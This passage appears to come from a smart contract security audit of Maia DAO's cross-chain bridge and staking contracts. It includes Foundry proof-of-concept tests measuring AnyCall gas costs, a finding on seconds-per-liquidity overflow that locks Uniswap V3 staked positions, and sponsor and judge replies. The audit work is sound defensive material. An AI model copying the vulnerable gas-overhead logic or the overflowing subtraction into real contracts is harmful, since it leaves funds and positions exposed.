OPERATIONS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Sends `amount` of ERC20 `token` from `from` to `to`./// Reverts upon failure.////// The `from` account must have at least `amount` approved for/// the current contract to manage.functionsafeTransferFrom(addresstoken,addressfrom,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{letm:=mload(0x40)// Cache the free memory pointer.mstore(0x60,amount)// Store the `amount` argument.mstore(0x40,to)// Store the `to` argument.mstore(0x2c,shl(96,from))// Store the `from` argument.// Store the function selector of `transferFrom(address,address,uint256)`.mstore(0x0c,0x23b872dd000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x1c,0x64,0x00,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x60,0)// Restore the zero slot to zero.mstore(0x40,m)// Restore the free memory pointer.}}/// @dev Sends all of ERC20 `token` from `from` to `to`./// Reverts upon failure.////// The `from` account must have their entire balance approved for/// the current contract to manage.functionsafeTransferAllFrom(addresstoken,addressfrom,addressto)internalreturns(uint256amount){/// @solidity memory-safe-assemblyassembly{letm:=mload(0x40)// Cache the free memory pointer.mstore(0x40,to)// Store the `to` argument.mstore(0x2c,shl(96,from))// Store the `from` argument.// Store the function selector of `balanceOf(address)`.mstore(0x0c,0x70a08231000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x1c,0x24,0x60,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}// Store the function selector of `transferFrom(address,address,uint256)`.mstore(0x00,0x23b872dd)// The `amount` argument is already written to the memory word at 0x60.amount :=mload(0x60)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x1c,0x64,0x00,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x60,0)// Restore the zero slot to zero.mstore(0x40,m)// Restore the free memory pointer.}}/// @dev Sends `amount` of ERC20 `token` from the current contract to `to`./// Reverts upon failure.functionsafeTransfer(addresstoken,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{mstore(0x14,to)// Store the `to` argument.mstore(0x34,amount)// Store the `amount` argument.// Store the function selector of `transfer(address,uint256)`.mstore(0x00,0xa9059cbb000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Sends all of ERC20 `token` from the current contract to `to`./// Reverts upon failure.functionsafeTransferAll(addresstoken,addressto)internalreturns(uint256amount) {/// @solidity memory-safe-assemblyassembly{mstore(0x00,0x70a08231)// Store the function selector of `balanceOf(address)`.mstore(0x20,address())// Store the address of the current contract.ifiszero(and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x1c,0x24,0x34,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x14,to)// Store the `to` argument.// The `amount` argument is already written to the memory word at 0x34.amount :=mload(0x34)// Store the function selector of `transfer(address,uint256)`.mstore(0x00,0xa9059cbb000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract./// Reverts upon failure.functionsafeApprove(addresstoken,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{mstore(0x14,to)// Store the `to` argument.mstore(0x34,amount)// Store the `amount` argument.// Store the function selector of `approve(address,uint256)`.mstore(0x00,0x095ea7b3000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `ApproveFailed()`.mstore(0x00,0x3e3f8f73)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Returns the amount of ERC20 `token` owned by `account`./// Returns zero if the `token` does not exist.functionbalanceOf(addresstoken,addressaccount)internalviewreturns(uint256amount) {/// @solidity memory-safe-assemblyassembly{mstore(0x14,account)// Store the `account` argument.// Store the function selector of `balanceOf(address)`.mstore(0x00,0x70a08231000000000000000000000000)amount :=mul(mload(0x20),and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x10,0x24,0x20,0x20)))}}}interfaceIAnycallExecutor{functioncontext()externalviewreturns(addressfrom,uint256fromChainID,uint256nonce);functionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata_extdata)externalreturns(boolsuccess,bytesmemoryresult);}interfaceIAnycallConfig{functioncalcSrcFees(address_app,uint256_toChainID,uint256_dataLength)externalviewreturns(uint256);functionexecutionBudget(address_app)externalviewreturns(uint256);functiondeposit(address_account)externalpayable;functionwithdraw(uint256_amount)external;}interfaceIAnycallProxy{functionexecutor()externalviewreturns(address);functionconfig()externalviewreturns(address);functionanyCall(address_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;functionanyCall(stringcalldata_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;}contractWETH9{stringpublicname="Wrapped Ether";stringpublicsymbol="WETH";uint8publicdecimals=18;eventApproval(addressindexedsrc,addressindexedguy,uint256wad);eventTransfer(addressindexedsrc,addressindexeddst,uint256wad);eventDeposit(addressindexeddst,uint256wad);eventWithdrawal(addressindexedsrc,uint256wad);mapping(address=>uint256)publicbalanceOf;mapping(address=>mapping(address=>uint256))publicallowance;// function receive() external payable {//   deposit();// }functiondeposit()publicpayable{balanceOf[msg.sender] +=msg.value;emitDeposit(msg.sender,msg.value);}functionwithdraw(uint256wad)public{require(balanceOf[msg.sender] >=wad);balanceOf[msg.sender] -=wad;payable(msg.sender).transfer(wad);emitWithdrawal(msg.sender,wad);}functiontotalSupply()publicviewreturns(uint256) {returnaddress(this).balance;}functionapprove(addressguy,uint256wad)publicreturns(bool) {allowance[msg.sender][guy] =wad;emitApproval(msg.sender,guy,wad);returntrue;}functiontransfer(addressdst,uint256wad)publicreturns(bool) {returntransferFrom(msg.sender,dst,wad);}functiontransferFrom(addresssrc,addressdst,uint256wad)publicreturns(bool) {require(balanceOf[src] >=wad);if(src!=msg.sender&&allowance[src][msg.sender] !=255) {require(allowance[src][msg.sender] >=wad);allowance[src][msg.sender] -=wad;}balanceOf[src] -=wad;balanceOf[dst] +=wad;emitTransfer(src,dst,wad);returntrue;}}contractAnycallExecutor{structContext{addressfrom;uint256fromChainID;uint256nonce;}// Context public override context;Contextpubliccontext;constructor() {context.fromChainID=1;context.from=address(2);context.nonce=1;}}contractAnycallV7Config{eventDeposit(addressindexedaccount,uint256amount);mapping(address=>uint256)publicexecutionBudget;/// @notice Deposit native currency crediting `_account` for execution costs on this chain/// @param _account The account to deposit and credit forfunctiondeposit(address_account)externalpayable{executionBudget[_account] +=msg.value;emitDeposit(_account,msg.value);}}contractBranchBridgeAgent{errorAnycallUnauthorizedCaller();errorGasErrorOrRepeatedTx();uint256publicremoteCallDepositedGas;uint256internalconstantMIN_EXECUTION_OVERHEAD=160_000;// 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executionsuint256internalconstantTRANSFER_OVERHEAD=24_000;WETH9publicimmutablewrappedNativeToken;AnycallV7ConfigpublicanycallV7Config;uint256publicaccumulatedFees;/// @notice Local Chain Iduint24publicimmutablelocalChainId;/// @notice Address for Bridge Agent who processes requests submitted for the Root Router Address where cross-chain requests are executed in the Root Chain.addresspublicimmutablerootBridgeAgentAddress;/// @notice Local Anyexec Addressaddresspublicimmutablelocal`AnyCall`ExecutorAddress;/// @notice Address for Local AnycallV7 Proxy Address where cross-chain requests are sent to the Root Chain Router.addresspublicimmutablelocal`AnyCall`Address;constructor() {AnycallExecutoranycallExecutor=newAnycallExecutor();local`AnyCall`ExecutorAddress=address(anycallExecutor);localChainId=1;wrappedNativeToken=newWETH9();local`AnyCall`Address=address(3);rootBridgeAgentAddress=address(2);anycallV7Config=newAnycallV7Config();}modifierrequiresExecutor() {_requiresExecutor();_;}function_requiresExecutor()internalview{if(msg.sender!=local`AnyCall`ExecutorAddress)revertAnycallUnauthorizedCaller();(addressfrom,,) =IAnycallExecutor(local`AnyCall`ExecutorAddress).context();if(from!=rootBridgeAgentAddress)revertAnycallUnauthorizedCaller();}function_replenishGas(uint256_executionGasSpent)internalvirtual{//Deposit GasanycallV7Config.deposit{value:_executionGasSpent}(address(this));// IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config()).deposit{value: _executionGasSpent}(address(this));}function_forceRevert()internalvirtual{IAnycallConfiganycallConfig=IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());uint256executionBudget=anycallConfig.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if(executionBudget>0)tryanycallConfig.withdraw(executionBudget) {}catch{}}/***@noticeInternal function repays gas used by Branch Bridge Agent to fulfill remote initiated interaction.-@param_recipientaddress to send excess gas to.-@param_initialGasgas used by Branch Bridge Agent.*/function_payExecutionGas(address_recipient,uint256_initialGas)internalvirtual{//Gas remaininguint256gasRemaining=wrappedNativeToken.balanceOf(address(this));//Unwrap GaswrappedNativeToken.withdraw(gasRemaining);//Delete Remote Initiated Action Statedelete(remoteCallDepositedGas);///Save gas leftuint256gasLeft=gasleft();//Get Branch Environment Execution Cost// Assume tx.gasPrice 1e9uint256minExecCost=1e9* (MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>gasRemaining) {_forceRevert();return;}//Replenish Gas_replenishGas(minExecCost);//Transfer gas remaining to recipientSafeTransferLib.safeTransferETH(_recipient,gasRemaining-minExecCost);//Save Gasuint256gasAfterTransfer=gasleft();//Check if sufficient balanceif(gasLeft-gasAfterTransfer>TRANSFER_OVERHEAD&&false) {// added false here so it doesn't enter._forceRevert();return;}}functionanyExecute(bytesmemorydata)publicvirtualrequiresExecutorreturns(boolsuccess,bytesmemoryresult){//Get Initial Gas Checkpointuint256initialGas=gasleft();//Action Recipientaddressrecipient=address(0x1);// for simplicity and since it is irrelevant //address(uint160(bytes20(data[PARAMS_START:PARAMS_START_SIGNED])));// Other Code Here//Deduct gas costs from deposit and replenish this bridge agent's execution budget._payExecutionGas(recipient,initialGas);}functiondepositIntoWeth(uint256amt)external{wrappedNativeToken.deposit{value:amt}();}fallback()externalpayable{}}contractBranchBridgeAgentEmpty{errorAnycallUnauthorizedCaller();errorGasErrorOrRepeatedTx();uint256publicremoteCallDepositedGas;uint256internalconstantMIN_EXECUTION_OVERHEAD=160_000;// 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executionsuint256internalconstantTRANSFER_OVERHEAD=24_000;WETH9publicimmutablewrappedNativeToken;AnycallV7ConfigpublicanycallV7Config;uint256publicaccumulatedFees;/// @notice Local Chain Iduint24publicimmutablelocalChainId;/// @notice Address for Bridge Agent who processes requests submitted for the Root Router Address where cross-chain requests are executed in the Root Chain.addresspublicimmutablerootBridgeAgentAddress;/// @notice Local Anyexec Addressaddresspublicimmutablelocal`AnyCall`ExecutorAddress;/// @notice Address for Local AnycallV7 Proxy Address where cross-chain requests are sent to the Root Chain Router.addresspublicimmutablelocal`AnyCall`Address;constructor() {AnycallExecutoranycallExecutor=newAnycallExecutor();local`AnyCall`ExecutorAddress=address(anycallExecutor);localChainId=1;wrappedNativeToken=newWETH9();local`AnyCall`Address=address(3);rootBridgeAgentAddress=address(2);anycallV7Config=newAnycallV7Config();}modifierrequiresExecutor() {_requiresExecutor();_;}function_requiresExecutor()internalview{if(msg.sender!=local`AnyCall`ExecutorAddress)revertAnycallUnauthorizedCaller();(addressfrom,,) =IAnycallExecutor(local`AnyCall`ExecutorAddress).context();if(from!=rootBridgeAgentAddress)revertAnycallUnauthorizedCaller();}function_replenishGas(uint256_executionGasSpent)internalvirtual{//Deposit GasanycallV7Config.deposit{value:_executionGasSpent}(address(this));// IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config()).deposit{value: _executionGasSpent}(address(this));}function_forceRevert()internalvirtual{IAnycallConfiganycallConfig=IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());uint256executionBudget=anycallConfig.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if(executionBudget>0)tryanycallConfig.withdraw(executionBudget) {}catch{}}/***@noticeInternal function repays gas used by Branch Bridge Agent to fulfill remote initiated interaction.-@param_recipientaddress to send excess gas to.-@param_initialGasgas used by Branch Bridge Agent.*/function_payExecutionGas(address_recipient,uint256_initialGas)internalvirtual{//Gas remaininguint256gasRemaining=wrappedNativeToken.balanceOf(address(this));//Unwrap GaswrappedNativeToken.withdraw(gasRemaining);//Delete Remote Initiated Action Statedelete(remoteCallDepositedGas);///Save gas leftuint256gasLeft=gasleft();// Everything after this is not taken into account//Get Branch Environment Execution Cost// Assume tx.gasPrice 1e9// uint256 minExecCost = 1e9 * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft);// //Check if sufficient balance// if (minExecCost > gasRemaining) {//     _forceRevert();//     return;// }// //Replenish Gas// _replenishGas(minExecCost);// //Transfer gas remaining to recipient// SafeTransferLib.safeTransferETH(_recipient, gasRemaining - minExecCost);// //Save Gas// uint256 gasAfterTransfer = gasleft();// //Check if sufficient balance// if (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD && false) { // added false here so it doesn't enter.//     _forceRevert();//     return;// }}functionanyExecute(bytesmemorydata)publicvirtual// requiresExecutorreturns(boolsuccess,bytesmemoryresult){//Get Initial Gas Checkpointuint256initialGas=gasleft();//Action Recipientaddressrecipient=address(0x1);// for simplicity and since it is irrelevant //address(uint160(bytes20(data[PARAMS_START:PARAMS_START_SIGNED])));// Other Code Here//Deduct gas costs from deposit and replenish this bridge agent's execution budget._payExecutionGas(recipient,initialGas);}functiondepositIntoWeth(uint256amt)external{wrappedNativeToken.deposit{value:amt}();}fallback()externalpayable{}}contractGasCalcisDSTest,Test{BranchBridgeAgentbranchBridgeAgent;BranchBridgeAgentEmptybranchBridgeAgentEmpty;functionsetUp()public{branchBridgeAgentEmpty=newBranchBridgeAgentEmpty();vm.deal(address(branchBridgeAgentEmpty.local`AnyCall`ExecutorAddress()),100ether);// executer pays gasvm.deal(address(branchBridgeAgentEmpty),100ether);branchBridgeAgent=newBranchBridgeAgent();vm.deal(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()),100ether);// executer pays gasvm.deal(address(branchBridgeAgent),100ether);}// code after end checkpoint gasLeft not includedfunctiontest_calcgasEmpty()public{// add weth balancebranchBridgeAgentEmpty.depositIntoWeth(100ether);vm.prank(address(branchBridgeAgentEmpty.local`AnyCall`ExecutorAddress()));uint256gasStart_=gasleft();branchBridgeAgentEmpty.anyExecute(bytes(""));uint256gasEnd_=gasleft();vm.stopPrank();uint256gasSpent_=gasStart_-gasEnd_;console.log("branchBridgeAgentEmpty.anyExecute Gas Spent => %d",gasSpent_);}// code after end checkpoint gasLeft includedfunctiontest_calcgas()public{// add weth balancebranchBridgeAgent.depositIntoWeth(100ether);vm.prank(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()));uint256gasStart=gasleft();branchBridgeAgent.anyExecute(bytes(""));uint256gasEnd=gasleft();vm.stopPrank();uint256gasSpent=gasStart-gasEnd;console.log("branchBridgeAgent.anyExecute Gas Spent => %d",gasSpent);}}
PoC #2 (The gas consumed byanyExecmethod inAnyCall)
We have contracts that simulate theAnycallcontracts:
AnycallV7ConfigAnycallExecutorAnycallV7
The flow like this:MPC=>AnycallV7=>AnycallExecutor=>IApp
In the code,IApp(_to).anyExecuteis commented out because we don’t want to calculate its gas since it is done in PoC #1.
Here is the output of the test:
[PASS]test_gasInanycallv7() (gas: 102613)Logs:anycallV7.anyExec Gas Spent => 110893
The Coded PoC
// PoC => Maia OmniChain: gasCalculation in `AnyCall` v7  contractspragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";/// IAnycallConfig interface of the anycall configinterfaceIAnycallConfig{functioncheckCall(address_sender,bytescalldata_data,uint256_toChainID,uint256_flags)externalviewreturns(stringmemory_appID,uint256_srcFees);functioncheckExec(stringcalldata_appID,address_from,address_to)externalview;functionchargeFeeOnDestChain(address_from,uint256_prevGasLeft)external;}/// IAnycallExecutor interface of the anycall executorinterfaceIAnycallExecutor{functioncontext()externalviewreturns(addressfrom,uint256fromChainID,uint256nonce);functionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata_extdata)externalreturns(boolsuccess,bytesmemoryresult);}/// IApp interface of the applicationinterfaceIApp{/// (required) call on the destination chain to exec the interactionfunctionanyExecute(bytescalldata_data)externalreturns(boolsuccess,bytesmemoryresult);/// (optional,advised) call back on the originating chain if the cross chain interaction fails/// `_data` is the orignal interaction arguments exec on the destination chainfunctionanyFallback(bytescalldata_data)externalreturns(boolsuccess,bytesmemoryresult);}libraryAnycallFlags{// call flags which can be specified by useruint256publicconstantFLAG_NONE=0x0;uint256publicconstantFLAG_MERGE_CONFIG_FLAGS=0x1;uint256publicconstantFLAG_PAY_FEE_ON_DEST=0x1<<1;uint256publicconstantFLAG_ALLOW_FALLBACK=0x1<<2;// exec flags used internallyuint256publicconstantFLAG_EXEC_START_VALUE=0x1<<16;uint256publicconstantFLAG_EXEC_FALLBACK=0x1<<16;}contractAnycallV7Config{uint256publicconstantPERMISSIONLESS_MODE=0x1;uint256publicconstantFREE_MODE=0x1<<1;mapping(string=>mapping(address=>bool))publicappExecWhitelist;mapping(string=>bool)publicappBlacklist;uint256publicmode;uint256publicminReserveBudget;mapping(address=>uint256)publicexecutionBudget;constructor() {mode=PERMISSIONLESS_MODE;}functioncheckExec(stringcalldata_appID,address_from,address_to)externalview{require(!appBlacklist[_appID],"blacklist");if(!_isSet(mode,PERMISSIONLESS_MODE)) {require(appExecWhitelist[_appID][_to],"no permission");}if(!_isSet(mode,FREE_MODE)) {require(executionBudget[_from] >=minReserveBudget,"less than min budget");}}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool) {return(_value&_testBits) ==_testBits;}}contractAnycallExecutor{bytes32publicconstantPAUSE_ALL_ROLE=0x00;eventPaused(bytes32role);eventUnpaused(bytes32role);modifierwhenNotPaused(bytes32role) {require(!paused(role) && !paused(PAUSE_ALL_ROLE),"PausableControl: paused");_;}mapping(bytes32=>bool)private_pausedRoles;mapping(address=>bool)publicisSupportedCaller;structContext{addressfrom;uint256fromChainID;uint256nonce;}// Context public override context;Contextpubliccontext;functionpaused(bytes32role)publicviewvirtualreturns(bool) {return_pausedRoles[role];}modifieronlyAuth() {require(isSupportedCaller[msg.sender],"not supported caller");_;}constructor(addressanycall) {context.fromChainID=1;context.from=address(2);context.nonce=1;isSupportedCaller[anycall] =true;}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool){return(_value&_testBits) ==_testBits;}// @dev `_extdata` content is implementation based in each versionfunctionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata/*_extdata*/)externalvirtualonlyAuthwhenNotPaused(PAUSE_ALL_ROLE)returns(boolsuccess,bytesmemoryresult){boolisFallback=_isSet(_flags,AnycallFlags.FLAG_EXEC_FALLBACK);context=Context({from:_from,fromChainID:_fromChainID,nonce:_nonce});if(!isFallback) {// we skip calling anyExecute since it is irrelevant for this PoC// (success, result) = IApp(_to).anyExecute(_data);}else{(success,result) =IApp(_to).anyFallback(_data);}context=Context({from:address(0),fromChainID:0,nonce:0});}}contractAnycallV7{eventLog`AnyCall`(addressindexedfrom,addressto,bytesdata,uint256toChainID,uint256flags,stringappID,uint256nonce,bytesextdata);eventLog`AnyCall`(addressindexedfrom,stringto,bytesdata,uint256toChainID,uint256flags,stringappID,uint256nonce,bytesextdata);eventLogAnyExec(bytes32indexedtxhash,addressindexedfrom,addressindexedto,uint256fromChainID,uint256nonce,boolsuccess,bytesresult);eventStoreRetryExecRecord(bytes32indexedtxhash,addressindexedfrom,addressindexedto,uint256fromChainID,uint256nonce,bytesdata);// Context of the request on originating chainstructRequestContext{bytes32txhash;addressfrom;uint256fromChainID;uint256nonce;uint256flags;}addresspublicmpc;boolpublicpaused;// applications should give permission to this executoraddresspublicexecutor;// anycall config contractaddresspublicconfig;mapping(bytes32=>bytes32)publicretryExecRecords;boolpublicretryWithPermit;mapping(bytes32=>bool)publicexecCompleted;uint256nonce;uint256privateunlocked;modifierlock() {require(unlocked==1,"locked");unlocked=0;_;unlocked=1;}/// @dev Access control functionmodifieronlyMPC() {require(msg.sender==mpc,"only MPC");_;}/// @dev pausable control functionmodifierwhenNotPaused() {require(!paused,"paused");_;}function_isSet(uint256_value,uint256_testBits)internalpurereturns(bool){return(_value&_testBits) ==_testBits;}/// @dev Charge an account for execution costs on this chain/// @param _from The account to charge for execution costsmodifierchargeDestFee(address_from,uint256_flags) {if(_isSet(_flags,AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {uint256_prevGasLeft=gasleft();_;IAnycallConfig(config).chargeFeeOnDestChain(_from,_prevGasLeft);}else{_;}}constructor(address_mpc) {unlocked=1;// needs to be unlocked initiallympc=_mpc;config=address(newAnycallV7Config());executor=address(newAnycallExecutor(address(this)));}/// @notice Calc unique IDfunctioncalcUniqID(bytes32_txhash,address_from,uint256_fromChainID,uint256_nonce)publicpurereturns(bytes32) {returnkeccak256(abi.encode(_txhash,_from,_fromChainID,_nonce));}function_execute(address_to,bytesmemory_data,RequestContextmemory_ctx,bytesmemory_extdata)internalreturns(boolsuccess) {bytesmemoryresult;tryIAnycallExecutor(executor).execute(_to,_data,_ctx.from,_ctx.fromChainID,_ctx.nonce,_ctx.flags,_extdata)returns(boolsucc,bytesmemoryres) {(success,result) = (succ,res);}catchError(stringmemoryreason) {result=bytes(reason);}catch(bytesmemoryreason) {result=reason;}emitLogAnyExec(_ctx.txhash,_ctx.from,_to,_ctx.fromChainID,_ctx.nonce,success,result);}/**@noticeExecute a cross chain interaction@devOnly callable by the MPC@param_toThe cross chain interaction target@param_dataThe calldata supplied for interacting with target@param_appIDThe app identifier to check whitelist@param_ctxThe context of the request on originating chain@param_extdataThe extension data for execute context*/// Note: changed from callback to memory so we can call it from the test contractfunctionanyExec(address_to,bytesmemory_data,stringmemory_appID,RequestContextmemory_ctx,bytesmemory_extdata)externalvirtuallockwhenNotPausedchargeDestFee(_to, _ctx.flags)onlyMPC{IAnycallConfig(config).checkExec(_appID,_ctx.from,_to);bytes32uniqID=calcUniqID(_ctx.txhash,_ctx.from,_ctx.fromChainID,_ctx.nonce);require(!execCompleted[uniqID],"exec completed");boolsuccess=_execute(_to,_data,_ctx,_extdata);// success = false on purpose, because when it is true, it consumes less gas. so we are considering worse case here// set exec completed (dont care success status)execCompleted[uniqID] =true;if(!success) {if(_isSet(_ctx.flags,AnycallFlags.FLAG_ALLOW_FALLBACK)) {// this will be executed here since the call failed// Call the fallback on the originating chainnonce++;stringmemoryappID=_appID;// fix Stack too deepemitLog`AnyCall`(_to,_ctx.from,_data,_ctx.fromChainID,AnycallFlags.FLAG_EXEC_FALLBACK|AnycallFlags.FLAG_PAY_FEE_ON_DEST,// pay fee on dest chainappID,nonce,"");}else{// Store retry record and emit a logbytesmemorydata=_data;// fix Stack too deepretryExecRecords[uniqID] =keccak256(abi.encode(_to,data));emitStoreRetryExecRecord(_ctx.txhash,_ctx.from,_to,_ctx.fromChainID,_ctx.nonce,data);}}}}contractGasCalc`AnyCall`v7isDSTest,Test{AnycallV7anycallV7;addressmpc=vm.addr(7);functionsetUp()public{anycallV7=newAnycallV7(mpc);}functiontest_gasInanycallv7()public{vm.prank(mpc);AnycallV7.RequestContextmemoryctx=AnycallV7.RequestContext({txhash:keccak256(""),from:address(0),fromChainID:1,nonce:1,flags:AnycallFlags.FLAG_ALLOW_FALLBACK});uint256gasStart_=gasleft();anycallV7.anyExec(address(0),bytes(""),"1",ctx,bytes(""));uint256gasEnd_=gasleft();vm.stopPrank();uint256gasSpent_=gasStart_-gasEnd_;console.log("anycallV7.anyExec Gas Spent => %d",gasSpent_);}}
Recommended Mitigation Steps
Increase theMIN_EXECUTION_OVERHEADby:
20_000forRootBridgeAgent.anyExecute.110_000foranyExecmethod inAnyCall.
20_000 + 110_000 = 130_000
SoMIN_EXECUTION_OVERHEADbecomes290_000instead of160_000.
Additionally, calculate the gas consumption of the input data passed then add it to the cost.
I suggest that theMIN_EXECUTION_OVERHEADshould be configurable/changeable. After launchingOmniChainfor some time, collect stats about the actual gas used forAnyCallon the chain, then adjust it accordingly. This also keeps you on the safe side in case any changes are applied onAnyCallcontracts in future, since it is upgradable.
0xBugsy (Maia) disagreed with severity and commented:
The variable data cost should be addressed by consultingpremium(). The value is used in their calcualtions here:uint256 totalCost = gasUsed * (tx.gasprice + _feeData.premium). We should abide and only pay as much as they will credit us as the remainder belonging to the user.
Trust (judge) commented:
Similar to #764 but different LOC and ultimately different vulnerability.
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-17] Second per liquidity inside could overflowuint256causing the LP position to be locked inUniswapV3Staker
Submitted byminhquanym
UniswapV3Stakerdepends on the second per liquidity inside values from theUniswap V3 Poolto calculate the amount of rewards a position should receive. This value represents the amount of second liquidity inside a tick range that is “active” (tickLower < currentTick < tickUpper). The second per liquidity inside a specific tick range is supposed to always increase over time.
In theRewardMathlibrary, the seconds inside are calculated by taking the current timestamp value and subtracting the value at the moment the position is staked. Since this value increases over time, it should be normal. Additionally, this implementation is similar toUniswap Team’s implementation.
functioncomputeBoostedSecondsInsideX128(uint256stakedDuration,uint128liquidity,uint128boostAmount,uint128boostTotalSupply,uint160secondsPerLiquidityInsideInitialX128,uint160secondsPerLiquidityInsideX128)internalpurereturns(uint160boostedSecondsInsideX128) {// this operation is safe, as the difference cannot be greater than 1/stake.liquidityuint160secondsInsideX128= (secondsPerLiquidityInsideX128-secondsPerLiquidityInsideInitialX128) *liquidity;// @audit secondPerLiquidityInsideX128 could smaller than secondsPerLiquidityInsideInitialX128...}
However, even though the second per liquidity inside value increases over time, it could overflowuint256, resulting in the calculation reverting. WhencomputeBoostedSecondsInsideX128()reverts, function_unstake()will also revert, locking the LP position in the contract forever.
Proof of Concept
Consider the value of the second per liquidity in three different timestamps:t1 < t2 < t3
secondPerLiquidity_t1= -10=2**256-10secondPerLiquidity_t2=100secondPerLiquidity_t3=300
As we can see, its value always increases over time, but the initial value could be smaller than 0. When calculatingcomputeBoostedSecondsInsideX128()for a period fromt1 -> t2, it will revert.
Additionally, as I mentioned earlier, this implementation is similar to the one from Uniswap team. However, please note that the Uniswap team used Solidity 0.7, which won’t revert on overflow and the formula works as expected while Maia uses Solidity 0.8.
For more information on how a tick is initialized, please refer tothis code
if(liquidityGrossBefore==0) {// by convention, we assume that all growth before a tick was initialized happened _below_ the tickif(tick<=tickCurrent) {info.feeGrowthOutside0X128=feeGrowthGlobal0X128;info.feeGrowthOutside1X128=feeGrowthGlobal1X128;info.secondsPerLiquidityOutsideX128=secondsPerLiquidityCumulativeX128;info.tickCumulativeOutside=tickCumulative;info.secondsOutside=time;}info.initialized=true;}
The second per liquidity inside a range that hastickLower < currentTick < tickUpperiscalculated as:
secondsPerLiquidityCumulativeX128-tickLower.secondsPerLiquidityOutsideX128-tickUpper.secondsPerLiquidityOutsideX128// If lower tick is just init,// Then: secondsPerLiquidityCumulativeX128 = tickLower.secondsPerLiquidityOutsideX128// And: tickUpper.secondsPerLiquidityOutsideX128 != 0// => Result will be overflow
Recommended Mitigation Steps
Consider using anuncheckedblock to calculate this value.
Assessed type
Under/Overflow
minhquanym (warden) commented:
